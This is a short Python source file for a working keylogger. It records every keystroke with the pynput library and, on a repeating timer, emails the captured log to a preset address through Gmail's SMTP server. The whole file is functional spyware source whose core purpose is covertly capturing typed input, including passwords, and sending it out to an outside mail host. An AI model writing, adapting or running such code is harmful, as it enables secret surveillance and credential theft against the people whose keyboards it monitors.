#!/usr/bin/env python

import pynput.keyboard #pynput for capturing keyboard keys
import threading # threading for setting a time interval for sending out email with with keys
import smtplib #smtp to send email


class Keylogger:
    def __init__(self, time_interval, email, password): # constructor method to get all class parameters
        self.log = "Keylogger Has Started" #notification if the keylogger is working.
        self.interval  = time_interval
        self.email = email
        self.password = password

    def append_to_log(self, string): # appending logs to the current log
        self.log = self.log + string

    def capture_keys(self, key):
        try:
            current_key = str(key.char)
        except AttributeError:
            if key == key.space: # if the key is equal to space replace it with " " hence a space
                current_key = " "
            elif key == key.tab: # same thing for a tabulation
                current_key = "    "
            else:
                current_key = " [" + str(key) + "] "
        self.append_to_log(current_key) # all keys captured should be appended

    def report(self):
        self.send_mail(self.email, self.password, "\n\n" + self.log)
        self.log = "" # setting the log to null again
        timer = threading.Timer(self.interval, self.report) # after given interval call the same function
        timer.start()

    def send_mail(self, email, password, message):
        server = smtplib.SMTP("smtp.gmail.com", 587)
        server.starttls() # obviously encrypt email credentials
        server.login(email, password)
        server.sendmail(email, email, message)
        server.quit()

    def start(self):
        keyboard = pynput.keyboard.Listener(on_press=self.capture_keys) #keyb listener object
        with keyboard:
            self.report()
            keyboard.join()